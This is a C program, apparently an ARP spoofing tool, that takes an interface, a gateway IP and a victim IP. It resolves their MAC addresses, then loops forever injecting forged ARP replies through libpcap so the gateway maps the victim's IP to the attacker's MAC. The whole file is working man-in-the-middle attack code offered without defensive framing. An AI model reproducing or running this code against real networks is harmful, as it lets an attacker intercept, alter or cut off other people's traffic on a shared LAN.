#include "../cn.h"

/* ARP Header, (assuming Ethernet+IPv4) */

typedef struct arp_header {

    u_int16_t htype;        /* Hardware Type           */
    u_int16_t ptype;        /* Protocol Type           */
    u_char hlen;            /* Hardware Address Length */        
    u_char plen;            /* Protocol Address Length */
    u_int16_t oper;         /* Operation Code          */
    u_char sha[6];          /* Sender hardware address */
    u_char spa[4];          /* Sender IP address       */
    u_char tha[6];          /* Target hardware address */
    u_char tpa[4];          /*Target IP address        */

} arphdr_t;


#define MAXBYTES2CAPTURE 2048

void die(const char *error) {
	fprintf(stderr, "Error: %s\n", error);
	exit(EXIT_FAILURE);
}

void print_mac(unsigned char *mac) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n",
		(unsigned char) mac[0],
		(unsigned char) mac[1],
		(unsigned char) mac[2],
		(unsigned char) mac[3],
		(unsigned char) mac[4],
		(unsigned char) mac[5]
    );
}

void set_ifr_name(struct ifreq *ifr, const char *interface) {	
    
    size_t if_name_len = strlen(interface);
	
    if(if_name_len < sizeof(ifr->ifr_name)) {
		memcpy(ifr->ifr_name, interface, if_name_len);
		ifr->ifr_name[if_name_len] = 0;
	} 
    else die("Interface name is too long");

}


int get_ifr_ifindex(struct ifreq *ifr) {

    int fd;
    if((fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP))) < 0)
		die(strerror(errno));

    if(ioctl(fd, SIOCGIFINDEX, ifr) < 0)
		  die(strerror(errno));
	
	return ifr->ifr_ifindex;
}


void get_ifr_hwaddr(struct ifreq *ifr) {

    int fd;
    if((fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP))) < 0)
		die(strerror(errno));
    
    if(ioctl(fd, SIOCGIFHWADDR, ifr) < 0)
		die(strerror(errno));
	
    if(ifr->ifr_hwaddr.sa_family != ARPHRD_ETHER)
		die("Not an ethernet interface");
}

void get_ifr_addr(struct ifreq *ifr) {

    int fd;
    if((fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP))) < 0)
		die(strerror(errno));
	
    if(ioctl(fd, SIOCGIFADDR, ifr) < 0) 
		die(strerror(errno));
}

u_int32_t get_ip_bits(const char* ip) {

    struct in_addr ip_addr = {0};
    if(inet_aton(ip, &ip_addr) == 0)
		die("Invalid Victim IP address");

	return ip_addr.s_addr;
}

void get_mac(const char *interface, unsigned char *mac) {
    
    struct ifreq ifr;
    set_ifr_name(&ifr,interface);
    get_ifr_hwaddr(&ifr);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    return;
}


void  get_target_mac(const char *interface, const char* target_ip,unsigned char *target_mac) {
	/* arp reuest will be broadcasted to every station in the LAN */

    int fd;
    u_int32_t ip_addr;
    struct ether_arp req;

    ip_addr = get_ip_bits(target_ip);

    if((fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP))) < 0)
		die(strerror(errno));

	const unsigned char ether_broadcast_addr[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

	struct ifreq ifr;

	set_ifr_name(&ifr, interface);

	/* special socket address type used for AF_PACKET */
	struct sockaddr_ll addr = {0};
	addr.sll_family   = AF_PACKET;
	addr.sll_ifindex  = get_ifr_ifindex(&ifr);
	addr.sll_halen    = ETHER_ADDR_LEN;
	addr.sll_protocol = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, ether_broadcast_addr, ETHER_ADDR_LEN);

	/* construct the ARP request */
	req.arp_hrd = htons(ARPHRD_ETHER);
	req.arp_pro = htons(ETH_P_IP);
	req.arp_hln = ETHER_ADDR_LEN;
	req.arp_pln = sizeof(in_addr_t);
	req.arp_op  = htons(ARPOP_REQUEST);

	/* zero because that's what we're asking for */
	memset(&req.arp_tha, 0, sizeof(req.arp_tha));
	memcpy(&req.arp_tpa, &ip_addr, sizeof(req.arp_tpa));
	get_ifr_hwaddr(&ifr);
	memcpy(&req.arp_sha, (unsigned char *) ifr.ifr_hwaddr.sa_data, sizeof(req.arp_sha));
	get_ifr_addr(&ifr);
	memcpy(&req.arp_spa, (unsigned char *) ifr.ifr_addr.sa_data + 2, sizeof(req.arp_spa));

	/* actually send it */
	if(sendto(fd, &req, sizeof(struct ether_arp), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
		die(strerror(errno));

	while(1) {
		/* can't use recvfrom() -- no network layer */
		int bytes;
		
        if((bytes = recv(fd, &req, sizeof(struct ether_arp), 0)) < 0) 
			die(strerror(errno));
		
        if(bytes == 0)    /* no response */
		    continue;
		
        unsigned int from_addr = (req.arp_spa[3] << 24) | (req.arp_spa[2] << 16) | (req.arp_spa[1] << 8) | (req.arp_spa[0] << 0);
		
        if(from_addr != ip_addr)
			continue;
		/* everything's good, we have our response */
		break;
    }	

    memcpy(target_mac, req.arp_sha, ETH_ALEN);

}



void set_ether_header(struct ether_header *ether_hdr,  u_int16_t type, const unsigned char *src_mac, const unsigned char *dst_mac) {
    
    ether_hdr->ether_type = htons(type);
    memcpy(ether_hdr->ether_shost,src_mac,ETH_ALEN);
    memcpy(ether_hdr->ether_dhost,dst_mac,ETH_ALEN);
    
    return;
}

void set_arp_header(struct ether_arp *arp_hdr, int type,const unsigned char *src_mac, const unsigned char *dst_mac, const char *dst_ip, const char *victim_ip) {

  	arp_hdr->arp_hrd = htons(ARPHRD_ETHER); 
	arp_hdr->arp_pro = htons(ETH_P_IP);
	arp_hdr->arp_hln = ETHER_ADDR_LEN;
	arp_hdr->arp_pln = sizeof(in_addr_t);
	arp_hdr->arp_op  = htons(type);

    u_int32_t victim_ip_ = get_ip_bits(victim_ip);
    u_int32_t dst_ip_ = get_ip_bits(dst_ip);

	memcpy(arp_hdr->arp_sha, src_mac, ETH_ALEN);
	memcpy(arp_hdr->arp_spa, &victim_ip_, sizeof(arp_hdr->arp_spa));
	memcpy(arp_hdr->arp_tha, dst_mac, ETH_ALEN);
	memcpy(arp_hdr->arp_tpa, &dst_ip_, sizeof(arp_hdr->arp_tpa));

    return;
}



int main(int argc, const char* argv[]) {

    if(argc != 4) {
        printf("USAGE : arp_spoofing.exe <interface> <gateway ip> <victim ip>\n");
        exit(EXIT_FAILURE);
    }

    char *interface, *gateway_ip, *victim_ip;
    unsigned char gateway_mac[6], victim_mac[6], src_mac[6];

    interface = strdup(argv[1]);
    gateway_ip = strdup(argv[2]);
    victim_ip = strdup(argv[3]);

    get_mac(interface, src_mac);
    printf("Source MAC : ");
    print_mac(src_mac);

    get_target_mac(interface, gateway_ip, gateway_mac);
    printf("Gateway MAC : ");
    print_mac(gateway_mac);


    get_target_mac(interface, victim_ip, victim_mac);
    printf("Victim MAC : ");
    print_mac(victim_mac);

    // while(1);

    bpf_u_int32 netaddr = 0, mask = 0;  /*To Store network 
                            address and netmask */

    struct bpf_program filter;    /* Place to store the
                        BPF filter program */

    char errbuf[PCAP_ERRBUF_SIZE]; /* Error buffer */

    pcap_t *descr  = NULL;  /* Network interface handler */

    struct pcap_pkthdr pkthdr; /*Packet information
                        (timestamp , size...)*/
    
    const unsigned char *packet = NULL; /* Received raw data */

    arphdr_t *arpheader = NULL; /* Pointer to ARP header */

    memset(errbuf, 0, PCAP_ERRBUF_SIZE);


    /* Open network device for packet capture */



    if((descr = pcap_open_live(interface, MAXBYTES2CAPTURE, 0, 512, errbuf)) == NULL){
        fprintf(stderr, "pcap_open_live(): %s \n", errbuf);
        exit(EXIT_FAILURE);
    }

    /* Look up info from the capture device */

    if(pcap_lookupnet(interface , &netaddr, &mask, errbuf) < 0) { 
        fprintf(stderr, "ERROR: pcap_lookupnet(): %s\n", errbuf );
        exit(EXIT_FAILURE);
    }

    /* Compiles the filter expresion into a BPF filter program */

    if(pcap_compile(descr, &filter, "host 192.168.137.1", 1, mask) < 0){
        fprintf(stderr, "Error in pcap_compile(): %s\n", pcap_geterr(descr) );
        exit(EXIT_FAILURE);
    }

    /* Load the filter program into the packet capture device */

    if(pcap_setfilter(descr,&filter) < 0) {
        fprintf(stderr, "Error in pcap_setfilter(): %s\n", pcap_geterr(descr));
        exit(EXIT_FAILURE);
    }

    while(1) {

        u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];

        struct ether_header *ether_hdr = (struct ether_header *)(packet);
        struct ether_arp *arp_hdr = (struct ether_arp *)(packet + sizeof(struct ether_header));

        set_ether_header(ether_hdr,ETH_P_ARP,src_mac,gateway_mac);
        set_arp_header(arp_hdr,ARPOP_REPLY,src_mac,gateway_mac,gateway_ip,victim_ip);

        if(pcap_inject(descr, packet, sizeof(packet)) < 0) {
            fprintf(stderr, "%s\n", errbuf);
            exit(EXIT_FAILURE);
        }

    }

    
    return 0;

}